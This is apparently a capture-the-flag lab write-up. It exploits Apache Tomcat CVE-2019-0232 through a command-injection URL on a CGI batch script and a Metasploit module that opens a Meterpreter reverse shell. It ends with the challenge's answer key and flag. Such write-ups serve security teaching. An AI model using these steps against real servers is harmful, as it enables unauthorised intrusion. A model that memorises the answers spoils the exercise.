# Day 12 Challenge
## Ready, Set, Elf

In this challnege we get to know about CVE's and how to use to our advantage using metasploit.

First we deploy the machine and do nmap scan to find the running services on the machine 

`nmap -Pn <IP Addr>`

We can see we have web service running on the machine.

Now lets open it and see what apache version the server is running. 

It looks like Apache 9.0.17 is running on the server

Lets search for if there is any known exploits for apache tomcat 9.0.17, looks like we have known exploit `CVE-2019-0232` which an individual can abuse the scripts stored in /cgi-bins/ or /cgi/ folders to his ownadvantage.

As in the challenge discription it says we have a script stored in cgi bin `elfwhacker.bat`

Lets try to open the link 

http://IP addr/cgi/elfwhacker.bat?&ls

Hmmm... we got the list of files in the directories now lets fire up metasploit and let it do the hardwork for us.

...
	
	> msfconsole
		/Lets search for CVE that we found earlier
	> search CVE-2019-0232
		/we got something nice lets use it 
	> Use 1
	> show OPTIONS
		/And set the RHOSTS and RPORT accordingly.
	> set RHOSTS <IP address of the machine>
	> set RPORT <Port on the webserver running on>
	> set TARGETURI /cgi/elfwhacker.bat
	> set LHOST <Your vpn ip>
		/Now lets run our exploit
	> run
		/Wait for few seconds untill the shell is pwnd.
	meterpreter> ***
		/Now lets type shell to get the windows shell
	meterpreter> shell
	shell> 
		/Now go ahead and find the flag1.txt

...

### Questions

...

	1. What is the version number of the web server?
		- Ans: 9.0.17

	2. What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)
		- Ans: CVE-2019-0232

	3. Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.
		- Ans: No answer needed!

	4. What are the contents of flag1.txt?
		- Ans: thm{whacking_all_the_elves}

	5. Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!
		-Ans: No answer needed!

...

Thank You!!!
<3